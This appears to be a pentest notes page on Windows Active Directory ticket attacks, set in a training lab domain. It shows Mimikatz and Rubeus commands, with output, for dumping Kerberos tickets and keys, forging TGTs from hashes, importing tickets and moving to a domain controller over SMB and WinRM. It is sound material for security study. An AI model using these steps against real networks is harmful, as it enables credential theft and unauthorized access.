---
title: Windows Pass the Ticket (PtT)
date: 2025-11-27 14:37:42
categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Pass the Hash (PtH)

tags:
  - mimikatz
  - Invoke-TheHash

cover: /img/ptt.png
top_img: /img/bg-img.jpg
description:
---


# Harvesting Kerberos tickets


## Mimikatz

➜ As a `non-administrative` user we can only get our tickets.

➜ As a `local administrator` user we can collect everything.

```powershell
mimikatz.exe

mimikatz # privilege::debug

mimikatz # sekurlsa::tickets /export

* Saved to file [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi !
* Saved to file [0;5063e]-1-0-40a50000-DC01$@LDAP-DC01.inlanefreight.htb.kirbi !
  
Group 2 - Ticket Granting Ticket
```


```powershell
c:\tools> dir *.kirbi

-a----        7/12/2022   9:44 AM           1445 [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
-a----        7/12/2022   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi
```


➜ The tickets that end with `$` belong to computer accounts.

➜ `TGT` tickets follow this format : `[randomvalue]-username@krbtgt-domain.local.kirbi`.

➜ `TGS` tickets follow this format : `[randomvalue]-username@service-domain.local.kirbi`.


## Rubeus

➜ As a `non-administrative` user we can only get our tickets.

➜ As a `local administrator` user we can collect everything.

```cmd
Rubeus.exe dump /nowrap


UserName              :  DC01$

doIE1jCCBNKgAwIBBaEDAgEWooID7TCCA+lhggPlMIID4aADAgEFoQkbB0hUQi5DT02iHDAaoAMCA <SNIP> T02jggOvMIIDq6ADAgESoQMCAQKiggOdBIIDmUE/AWlM6VlpGv+Gfvn6bHXrpRjRbsgcw9beSqS2iwERsGa3JidGd0GwdIVEIuQ09N

UserName              : plaintext

doIE9jCCBPKgAwIBBaEDAgEWooIECTCCBAVhggQBMIID/aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQ <SNIP> EzARGwZrcmJ0Z3QbB0hUQi5DT02jggPLMIIDx6ADAgESoQMCAQKiggO5BIIDtc6ptErl3sAxJsqVTJ0Z3QbB0hbB0hB0hUQi5DT00=
```




# Pass the Key aka. OverPass the Hash

## Extract Hashes

➜ To perform OverPass the Hash we need to have access to the `AES256_HMAC` and `RC4_HMAC` keys.

```powershell
c:\tools> mimikatz.exe

mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys

<SNIP>

         * Username : plaintext
         * Domain   : inlanefreight.htb
         * Password : (null)
         * Key List :
           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_nt_exp   3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old_exp  3f74aa8f08f712f09cd5177b5c1ce50f
<SNIP>
```


## Forge a TGT Ticket

`➜ Note: Modern Windows domains use AES encryption by default in normal Kerberos exchanges. If we use an rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade."`

### mimikatz

`➜ Requires administrative access.`

```powershell
c:\tools> mimikatz.exe

mimikatz # privilege::debug

mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

➜ This will create a new `cmd.exe` window that we can use to request access to any service we want in the context of the target user.


### Rubeus

`➜ Administrative access not required.`

We have four hash types that can be used:

- /rc4
- /aes128
- /aes256
- /des

```powershell
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA < SNIP > wZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIsGa3JidGd0GwdodGIuY29t
```



# Pass the Ticket (PtT) To The current Session


## Loading a TGT Directly Into the Current Logon Session


```powershell
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt

[+] Ticket successfully imported!
```

## Importing a .kirbi Ticket

#### Rubeus

```powershell
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

[+] ticket successfully imported!
```
#### Mimikatz

```powershell
mimikatz.exe 

mimikatz # privilege::debug

mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

## Example

Then we can access shares using the created the imported ticket.

```powershell
c:\tools> dir \\DC01.inlanefreight.htb\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/4/2022  11:17 AM                Program Files
d-----         6/4/2022  11:17 AM                Program Files (x86)
```


# Pass The Ticket with PowerShell Remoting (winrm)

## Mimikatz
#### Import Ticket

```powershell
mimikatz.exe

mimikatz # privilege::debug

mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```

#### Connect winrm

```powershell
c:\tools>powershell

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
[DC01]: PS C:\Users\john\Documents>
```



## Rubeus

#### Create a sacrificial process

`➜ The command will open a new cmd window`

```powershell
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
#### Import Ticket

`➜ From that window, we can execute Rubeus to request a new TGT.`

```powershell
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

#### Connect winrm

```powershell
c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
```